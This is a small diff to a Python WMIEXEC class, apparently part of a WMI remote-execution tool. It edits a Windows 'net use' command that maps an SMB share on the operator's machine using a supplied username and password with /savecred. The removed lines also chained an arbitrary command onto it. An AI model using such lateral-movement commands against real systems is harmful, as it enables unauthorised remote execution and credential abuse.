@@ -173,11 +173,11 @@ class WMIEXEC:
         #                                                                                         self.__username, 
         #                                                                                         self.__password, 
         #                                                                                         commandData)
-        command += 'net use \\\\{}\\{} /savecred /p:no /user:{} {} & {} "'.format(local_ip, 
+        command += 'net use \\\\{}\\{} /savecred /p:no /user:{} {}"'.format(local_ip, 
                                                                                                  self.__share_name, 
                                                                                                  self.__username, 
-                                                                                                 self.__password, 
-                                                                                                 commandData)
+                                                                                                 self.__password 
+                                                                                                 )
         
         logging.debug('wmi Executing_fileless command: {}'.format(command))
 
